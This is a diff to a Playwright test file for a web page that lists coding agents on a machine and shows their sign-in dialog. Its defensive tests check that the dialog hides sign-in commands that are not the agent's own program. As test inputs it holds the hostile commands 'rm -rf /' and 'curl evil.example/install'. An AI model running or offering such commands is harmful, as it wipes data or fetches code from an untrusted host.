@@ -595,6 +595,31 @@ test.describe("the Coding agents rows", () => {
     await expect(banner(page)).toHaveCount(0);
   });
 
+  test("a failed-check id that is not a string cannot take the page down", async ({ page }) => {
+    const w = world({
+      bindings: [binding({ safeProblem: "AUTH" })],
+      failedChecks: [
+        { checkId: "capability:model", reason: "claude: not signed in" },
+      ],
+    });
+    // Broken data from the server: ids that are not strings.
+    await open(page, w);
+    await page.route(
+      (url) => url.pathname === `/v1/workers/${MACHINE_ID}`,
+      (route) =>
+        route.fulfill(json({
+          ...workerBody(w),
+          failedCheckIds: [123, null, {}, "capability:model"],
+        })),
+    );
+    await page.reload();
+    await expect(page.getByTestId("machine-detail-page")).toBeVisible();
+    await expect(row(page, "claude")).toBeVisible();
+    // Not read as an agent's sign-in: the generic banner is what shows.
+    await expect(banner(page)).toHaveCount(0);
+    await expect(page.getByTestId("machine-problem-banner")).toBeVisible();
+  });
+
   test("the header reads Ready only when every agent is signed in, and the machine's own reading wins otherwise", async ({ page }) => {
     await open(
       page,
@@ -812,6 +837,36 @@ test.describe("the sign-in dialog", () => {
     await expect(dialog(page).getByRole("link")).toHaveCount(0);
   });
 
+  test("a command that is not the agent's own program is not shown, however plain", async ({ page }) => {
+    for (const instructions of ["rm -rf /", "curl evil.example/install"]) {
+      await open(
+        page,
+        world({
+          script: script({
+            flow: "terminal",
+            createState: "terminal",
+            challenge: null,
+            instructions,
+            reads: ["terminal"],
+          }),
+        }),
+      );
+      await row(page, "claude").getByRole("button", {
+        name: "Sign in",
+        exact: true,
+      }).click();
+      await expect(
+        dialog(page).getByText(
+          "Finish signing in from a terminal on the machine.",
+        ),
+      ).toBeVisible();
+      await expect(dialog(page)).not.toContainText(instructions);
+      await expect(dialog(page).getByRole("button", { name: "Copy" }))
+        .toHaveCount(0);
+      await page.reload();
+    }
+  });
+
   test("a command with a second line is not shown or copied: only one plain line ever is", async ({ page }) => {
     await open(
       page,
@@ -830,7 +885,9 @@ test.describe("the sign-in dialog", () => {
       exact: true,
     }).click();
     await expect(
-      dialog(page).getByText("Finish signing in in a terminal on the machine."),
+      dialog(page).getByText(
+        "Finish signing in from a terminal on the machine.",
+      ),
     ).toBeVisible();
     await expect(dialog(page)).not.toContainText("rm -rf");
     await expect(dialog(page).getByRole("button", { name: "Copy" }))
@@ -886,7 +943,9 @@ test.describe("the sign-in dialog", () => {
       exact: true,
     }).click();
     await expect(
-      dialog(page).getByText("Finish signing in in a terminal on the machine."),
+      dialog(page).getByText(
+        "Finish signing in from a terminal on the machine.",
+      ),
     ).toBeVisible();
     await expect(dialog(page).getByRole("button", { name: "Copy" }))
       .toHaveCount(0);
